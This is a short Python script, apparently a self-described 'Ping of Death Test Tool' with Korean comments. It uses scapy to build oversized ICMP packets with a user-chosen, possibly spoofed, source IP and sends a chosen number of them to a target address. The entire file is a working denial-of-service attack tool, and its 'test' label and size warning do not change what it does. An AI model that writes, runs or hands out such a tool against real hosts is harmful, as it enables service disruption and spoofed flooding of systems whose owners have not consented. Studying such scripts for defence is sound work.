#!/usr/bin/python
from scapy.all import IP, ICMP, send

def main():
    print("=== Ping of Death Test Tool ===")

    # 사용자 입력 받기
    source_ip = input("Enter Source IP (e.g., 127.0.0.1): ").strip()
    target_ip = input("Enter Target IP (e.g., 127.0.0.1): ").strip()
    message = input("Enter message to send (default: 'T'): ").strip() or "T"
    packet_size = int(input("Enter packet size (default: 60000): ").strip() or 60000)
    number_packets = int(input("Enter number of packets to send (default: 5): ").strip() or 5)

    # 패킷 크기 제한 경고
    if packet_size > 65000:
        print("Warning: Packet size exceeds 65000 bytes. This may cause issues in some environments.")
        proceed = input("Do you want to continue? (yes/no): ").strip().lower()
        if proceed != "yes":
            print("Exiting...")
            return

    try:
        # Ping of Death 패킷 생성
        pod_packet = IP(src=source_ip, dst=target_ip) / ICMP() / (message * packet_size)

        print(f"\n[INFO] Sending {number_packets} packets to {target_ip}...")
        for i in range(number_packets):
            send(pod_packet, verbose=False)
            print(f"[INFO] Packet {i+1}/{number_packets} sent successfully.")
        
        print("\n[INFO] All packets sent.")
    
    except Exception as e:
        print(f"[ERROR] An error occurred: {e}")

if __name__ == "__main__":
    main()
